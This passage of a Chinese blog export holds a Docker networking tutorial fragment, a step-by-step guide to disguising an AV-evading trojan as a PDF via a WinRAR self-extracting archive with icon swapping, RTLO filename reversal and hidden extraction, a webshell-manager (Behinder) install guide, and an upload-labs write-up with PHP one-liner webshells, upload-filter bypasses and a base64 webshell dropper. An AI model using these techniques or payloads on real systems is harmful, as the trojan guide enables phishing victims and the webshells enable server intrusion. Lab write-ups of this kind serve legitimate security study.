sequence</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">root@kali:/var/lib/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data<span class="comment"># docker exec -it ad7cdf683208 /bin/bash</span></span><br><span class="line">[root@ad7cdf683208 /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  volume01  volume02</span><br><span class="line">[root@ad7cdf683208 /]<span class="comment"># cd volume01</span></span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># ls -al</span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug  3 04:54 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Aug  3 04:13 ..</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:52 byqadf.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:54 byqadf02.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:16 container.txt</span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>由此我们看到qadf的数据同步到了qadf02</p>
<p>如果我们把qadf容器删除了，那么qadf02容器是否还能访问这两个目录？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[/var/…/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data]</span><br><span class="line">└─<span class="comment"># docker rm -f ad7cdf683208                                                       </span></span><br><span class="line">ad7cdf683208</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/var/…/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data]</span><br><span class="line">└─<span class="comment"># docker attach 2845c8976ee8 </span></span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># ls -al </span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug  3 04:54 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Aug  3 04:42 ..</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:52 byqadf.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:54 byqadf02.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:16 container.txt</span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>经过测试依旧可以，由此数据卷容器之间的容器是一个拷贝的关系</p>
<h2 id="docker网络"><a href="#docker网络" class="headerlink" title="docker网络"></a>docker网络</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 我们发现这个容器带来网卡，都是一对对的</span><br><span class="line"># evth-pair就是一对的虚拟设备接口，他们都是成对出现的，一段连着协议，一段彼此相连#正因为有这个特性，evth-pair充当一个桥粱，连接各种虚拟网络设备的</span><br><span class="line"># openstac，Docker容器之间的连接，ovs的连接，都是使用evth-pair技术3、我们来测试下</span><br></pre></td></tr></table></figure>

<p>容器之间是否可以ping通？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@kuangshen /]# docker exec -it tomcat02 ping 172.18.0.2</span><br><span class="line">#结论:容器和容器之间是可以互相ping通的!</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/docker/1691132000556-1.png" alt="img"></p>
<h3 id="–link"><a href="#–link" class="headerlink" title="–link"></a>–link</h3><p>可以解决网络连接问题</p>
<p><img src="/2023/08/03/docker/1691132065733-4.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看hosts配置，在这里原理发现!</span><br><span class="line">[root@kuangshen/]# docker exec -it tomcat03 cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">: :1 localhost ip6-1ocalhost ip6-1oopbackfe00</span><br><span class="line">: : o ip6-localnet</span><br><span class="line">ff00: :o ip6-mcastprefix</span><br><span class="line">ff02: :1 ip6-a71nodes</span><br><span class="line">ff02: : 2 ip6-a77routers</span><br><span class="line">172.18.0.3tomcat02 312857784cd4</span><br><span class="line">172.18.0.4 5ca72d80ebb0</span><br></pre></td></tr></table></figure>

<p>本质探究︰–link就是我们在hosts配置中增加了一个172.18.0.3 tomcat02 312857784cd4</p>
<p>我们现在玩Docker已经不建议使用	–link 了 !<br>自定义网络!不适用dockerO !<br>docker0问题:他不支持容器名连接访问!</p>
<h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><p>docker network命令</p>
<p><img src="/2023/08/03/docker/image-20230804145534812.png" alt="image-20230804145534812"></p>
<p>查看所有的docker网络</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure>

<p>网络模式</p>
<p>bridge :桥接docker(默认，自己床架也使用bridge模式)</p>
<p>none :不配置网络</p>
<p>host :和宿主机共享网络</p>
<p>container:容器网络连通!(用的少!局限很大)测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#我们直接启动的命令--net bridge，而这个就是我们的</span><br><span class="line">dockerOdocker run -d -P --name tomcat01 tomcat</span><br><span class="line">docker run -d -p --name tomcat01 --net bridge tomcat</span><br><span class="line"></span><br><span class="line">docker0特点:默认，域名不能访问， --link可以打通连接!</span><br><span class="line"></span><br><span class="line">#我们可以自定义一个网络!</span><br><span class="line">#--driver bridge</span><br><span class="line">#--subnet 192.168.0.0/16</span><br><span class="line">#--gateway 192.168.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/docker/image-20230804145604944.png" alt="image-20230804145604944"></p>
<p>我们使用自己创建的网络启动容器 –net 网络名</p>
<p>这样我们的容器之间可以相互ping通</p>
<p>好处∶<br>redis -不同的集群使用不同的网络，保证集群是安全和健康的mysql -不同的集群使用不同的网络，保证集群是安全和健康的</p>
<h3 id="网络连通"><a href="#网络连通" class="headerlink" title="网络连通"></a>网络连通</h3><p><img src="/2023/08/03/docker/image-20230804145615904.png" alt="image-20230804145615904"></p>
<p>如何实现tomcat01连接tomcat-net？</p>
<p><img src="/2023/08/03/docker/image-20230804145624250.png" alt="image-20230804145624250"></p>
<p>docker network connect 网络名 容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network connect mynet tomcat01</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#测试打通tomcato1 - mynet</span><br><span class="line">#连通之后就是将tomcat01放到了mynet网络下?</span><br><span class="line">#一个容器两个ip地址!</span><br><span class="line">#阿里云服务:公网ip私网ip</span><br></pre></td></tr></table></figure>



<h2 id="发布自己的镜像"><a href="#发布自己的镜像" class="headerlink" title="发布自己的镜像"></a>发布自己的镜像</h2><h3 id="dockerhub"><a href="#dockerhub" class="headerlink" title="dockerhub"></a>dockerhub</h3><p>1、地址<a href="https://hub.docker.com注册自己的账号/">https://hub.docker.com注册自己的账号</a></p>
<p>2、确定这个这账号可以登录<br>3、在我们服务器上提交自己的镜像</p>
<p>登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login -u 用户名</span><br></pre></td></tr></table></figure>

<p>上传镜像</p>
<p>docker push 作者名&#x2F;镜像名:版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker push qingan/qacentos:1.0</span><br></pre></td></tr></table></figure>

<h3 id="阿里云镜像站"><a href="#阿里云镜像站" class="headerlink" title="阿里云镜像站"></a>阿里云镜像站</h3><p>阿里云镜像仓库申请地址：</p>
<ul>
<li><a href="https://cr.console.aliyun.com/repository/cn-beijing/wei-sun/mysql/details">https://cr.console.aliyun.com/repository/cn-beijing/wei-sun/mysql/details</a></li>
</ul>
<p>参考官方文档</p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>winrar自解压钓鱼木马</title>
    <url>/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.免杀木马</span><br><span class="line">2.ResourceHacker工具</span><br><span class="line">3.winrar压缩工具</span><br><span class="line"></span><br><span class="line">https://www.aliyundrive.com/s/ktao3DdSrL5</span><br><span class="line">提取码: 49nq</span><br></pre></td></tr></table></figure>

<h2 id="文件选项配置"><a href="#文件选项配置" class="headerlink" title="文件选项配置"></a>文件选项配置</h2><p>创建文件夹把捆绑的文件和木马放在同一目录下</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874611781-4.png" alt="img"></p>
<p>点击查看—勾选文件拓展名和隐藏的项目</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874652374-7.png" alt="img"></p>
<p>右键pdf.exe即你制作的木马程序点击属性—勾选隐藏—应用—确认</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874665223-10.png" alt="img"></p>
<h2 id="自解压程序配置"><a href="#自解压程序配置" class="headerlink" title="自解压程序配置"></a>自解压程序配置</h2><p>选中这两个文件</p>
<p>一个方法是用WinRAR打开本目录</p>
<p>这里演示右键添加到压缩文件</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874683479-13.png" alt="img"></p>
<p>在压缩选项里选择创建自解压格式压缩文件</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874703419-16.png" alt="img"></p>
<p>点击高级—自压缩选项</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874717652-19.png" alt="img"></p>
<p>在常规的压缩路径里填写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Temp</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874733367-22.png" alt="img"></p>
<p>在设置里填写C:\Windows\Temp\这里是你的木马文件（根据自己命名修改）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Temp\pdf.exe</span><br><span class="line">C:\Windows\Temp\FFmpeg.pdf</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874754488-25.png" alt="img"></p>
<p>模式里选择全部隐藏</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874771011-28.png" alt="img"></p>
<p>更新选择选择解压并更新文件和覆盖所有文件</p>
<p>之后点击确认</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874785951-31.png" alt="img"></p>
<p>再点击确认即可</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874805811-34.png" alt="img"></p>
<p>会在当前目录下生成你文件夹命名的自解压程序</p>
<p>这里用ResourceHacker修改demo.exe程序图标</p>
<p>将demo.exe拖入ResourceHacker</p>
<p>选择Icon Group，右键选择Replace icon</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874838362-37.png" alt="img"></p>
<p>打开</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874849788-40.png" alt="img"></p>
<p>替换</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874867441-43.png" alt="img"></p>
<p>另存为</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874881209-46.png" alt="img"></p>
<p>我这里另存为时命名为FFmpeg使用教程</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874900922-49.png" alt="img"></p>
<p>将exe改成scr后缀，以便更好的伪装(scr后缀也可执行exe)</p>
<p>可以加入反转字符</p>
<p><a href="https://symbl.cc/en/202E/">https://symbl.cc/en/202E/</a></p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874929964-52.png" alt="img"></p>
<p>命名文件名时粘贴反转字符</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874973262-55.png" alt="img"></p>
<p>之后再次命名加入多个空格让真实后缀很难看到</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695874990601-58.png" alt="img"></p>
<p>火绒查杀效果</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695875014123-61.png" alt="img"></p>
<p>效果演示</p>
<p><img src="/2023/09/28/winrar%E8%87%AA%E8%A7%A3%E5%8E%8B%E9%92%93%E9%B1%BC%E6%9C%A8%E9%A9%AC/1695875044546-64.gif" alt="img"></p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>冰蝎3.0 window安装教程</title>
    <url>/2023/08/03/%E5%86%B0%E8%9D%8E3-0window%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">操作系统：window10 <span class="number">64</span></span><br><span class="line">Java版本：<span class="number">15</span></span><br><span class="line">冰蝎版本：Behinder_v3<span class="number">.0</span>_Beta_9</span><br><span class="line">JavaFX：<span class="number">11.0</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<p>整理很长时间的冰蝎，kali里面总算装好了，但是也只能使用冰蝎4.0不能使用4.0.5。</p>
<p>打不开的原因：冰蝎beta7版本客户端不再内置javafx库，java11以后版本移除了JavaFX库，要运行冰蝎需要自己下载JavaFX库。</p>
<p>冰蝎需要Java8的环境并且要有JavaFX库，但装好后burpsuit就无法使用了，所以最好在window装冰蝎。</p>
<p>经过多次尝试3.0能正常使用4.以上好像就不行了下面是3.0教程</p>
<p>冰蝎下载链接：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
<p>Java15下载链接：<a href="https://www.oracle.com/java/technologies/javase/jdk15-archive-downloads.html">https://www.oracle.com/java/technologies/javase/jdk15-archive-downloads.html</a></p>
<p>Java环境变量配置：<a href="https://blog.csdn.net/qq_41436122/article/details/82620080">https://blog.csdn.net/qq_41436122/article/details/82620080</a></p>
<p>JavaFX下载链接：<a href="https://gluonhq.com/products/javafx/">https://gluonhq.com/products/javafx/</a></p>
<p>选择适合的版本，比如我的是java11.0.2</p>
<p>然后选择windows的SDK版本</p>
<p>下载，解压，记录这个lib文件夹的路径</p>
<p>然后在该目录下新建一个txt，写入下面的代码（注意自行修改lib目录的路径）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start javaw --module-path <span class="string">&quot;F:\bx\openjfx-11.0.2_windows-x64_bin-sdk\javafx-sdk-11.0.2\lib&quot;</span> --add-modules=javafx.base --add-modules=javafx.controls  --add-modules=javafx.fxml  --add-modules=javafx.graphics  --add-modules=javafx.media  --add-modules=javafx.swing  --add-modules=javafx.web -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p>修改为start.bat，双击，即可打开冰蝎</p>
<p><img src="/2023/08/03/%E5%86%B0%E8%9D%8E3-0window%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1691076168041-4.png" alt="img"></p>
<p><img src="/2023/08/03/%E5%86%B0%E8%9D%8E3-0window%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1691076168041-1.png" alt="img"></p>
<p><img src="/2023/08/03/%E5%86%B0%E8%9D%8E3-0window%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1691076168041-2.png" alt="img"></p>
<p><img src="/2023/08/03/%E5%86%B0%E8%9D%8E3-0window%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/1691076168041-3.png" alt="img"></p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>webshell管理工具</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<p>文件上传</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630894-18.png" alt="img"></p>
<h2 id="前端JS检测绕过-pass-01"><a href="#前端JS检测绕过-pass-01" class="headerlink" title="前端JS检测绕过 pass-01"></a>前端JS检测绕过 pass-01</h2><p>准备一个图片一个一句话木马</p>
<p>一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>cmd命令合并</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">copy /b D:\qqinfor\<span class="number">1913116865</span>\FileRecv\漏洞\上传\<span class="number">6</span>.jpg + D:\qqinfor\<span class="number">1913116865</span>\FileRecv\漏洞\上传\<span class="number">7</span>.php <span class="number">8</span>.png</span><br></pre></td></tr></table></figure>

<p>上传抓包直接修改成8.php发送</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630891-1.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.24.0/upload/8.php?cmd=system(&#x27; ls /var/www/html&#x27; );</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630891-2.png" alt="img"></p>
<h2 id="文件类型MIME绕过-Pass-02"><a href="#文件类型MIME绕过-Pass-02" class="headerlink" title="文件类型MIME绕过 Pass-02"></a>文件类型MIME绕过 Pass-02</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || (<span class="variable">$_FILES</span>[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || (<span class="variable">$_FILES</span>[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;))</span><br></pre></td></tr></table></figure>

<p>只对表单和文件类型进行了检验</p>
<p>只要文件类型满足条件即可 Content-Type: image&#x2F;jpeg</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630891-3.png" alt="img"></p>
<p>同样可以用Pass-01的方法进行上传</p>
<h1 id="黑名单验证绕过-Pass-03"><a href="#黑名单验证绕过-Pass-03" class="headerlink" title="黑名单验证绕过 Pass-03"></a>黑名单验证绕过 Pass-03</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>只不允许黑名单文件上传</p>
<p>如果配置文件解析了php5 php3 phtml这样的文件，php3，php4，php5，pht，phtml等文件后缀也是可以被当作php文件进行解析的。</p>
<p>将文件名改为1.php5</p>
<h1 id="htaccess解析漏洞"><a href="#htaccess解析漏洞" class="headerlink" title=".htaccess解析漏洞"></a>.htaccess解析漏洞</h1><p>.htaccess文件内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>上传.jpg文件会把jpg图片解析为php</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630891-4.png" alt="img"></p>
<h1 id="空格绕过-pass-06-Windows"><a href="#空格绕过-pass-06-Windows" class="headerlink" title="空格绕过 pass 06 Windows"></a>空格绕过 pass 06 Windows</h1><p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-5.png" alt="img"></p>
<p>分析源码发现没有对空格进行处理</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-6.png" alt="img"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//43.139.33.242:29949/upload/202304111544035085.php%20</span></span><br></pre></td></tr></table></figure>

<h1 id="绕过-pass-07-Windows"><a href="#绕过-pass-07-Windows" class="headerlink" title=".绕过 pass 07 Windows"></a>.绕过 pass 07 Windows</h1><p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-7.png" alt="img"></p>
<h1 id="DATA绕过-必须是Windows"><a href="#DATA绕过-必须是Windows" class="headerlink" title="::$DATA绕过 必须是Windows"></a>::$DATA绕过 必须是Windows</h1><p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-8.png" alt="img"></p>
<h1 id="单次过滤绕过"><a href="#单次过滤绕过" class="headerlink" title="单次过滤绕过"></a>单次过滤绕过</h1><p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-9.png" alt="img"></p>
<p>我们发现这里该有的过滤都有了，但这里只是进行了一次过滤（包括前面也只有一次过滤）。</p>
<p>那么可以多写几个过滤的内容这里要上传1.php比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.pphphp</span><br><span class="line">1.php. .</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-10.png" alt="img"></p>
<h1 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h1><p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-11.png" alt="img"></p>
<p>重点：这里也是过滤一次 把出现的黑名单内容替换为空</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-12.png" alt="img"></p>
<h1 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h1><p>绕过白名单验证方式：</p>
<p>1、%00和0x00截断。%00是被服务器解码为0x00发挥了截断作用</p>
<p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</p>
<p>%00和0x00是有区别的：%00是URL中的，0x00是文件命名</p>
<p>%00需要PHP版本小于5.3.4，且打开php的配置文件php-ini，将magic_quotes_gpc（魔术引号）设置为Off</p>
<p>get会自动解码 %00</p>
<p>post不会解码 %00 -&gt; url编码</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-13.png" alt="img"></p>
<p>2、0x0a截断：原理同上</p>
<p>3、MIME绕过。burp抓包，修改Content-type值为合法的image&#x2F;jpeg，image&#x2F;gif等即可绕过</p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-14.png" alt="img"></p>
<p>POST方式把%00进行url编码 decode，hex修改00</p>
<h1 id="文件包含-文件上传"><a href="#文件包含-文件上传" class="headerlink" title="文件包含+文件上传"></a>文件包含+文件上传</h1><p>上传带有后门的图片马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">/* </span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！ </span><br><span class="line">*/ </span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$file</span>))&#123; </span><br><span class="line">    include <span class="variable">$file</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(__file__); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://43.139.33.242:29949/include.php?file=upload/2520230420142439.jpg">http://43.139.33.242:29949/include.php?file=upload/2520230420142439.jpg</a></p>
<p><img src="/2023/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1691048630892-15.png" alt="img"></p>
<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>将一句话木马进行base64编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p>PHP大马生小马</p>
<p>这里命名为1.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+&#x27;</span>;</span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>, base64_decode(<span class="variable">$a</span>));</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里例如我这个上传的是1.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Pass-17/index.php?action=show_code HTTP/1.1</span><br><span class="line">Host: 43.139.33.242:50147</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------360549146619018030902827876042</span><br><span class="line">Content-Length: 502</span><br><span class="line">Origin: http://43.139.33.242:50147</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://43.139.33.242:50147/Pass-17/index.php?action=show_code</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------360549146619018030902827876042</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+&#x27;</span>;</span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span 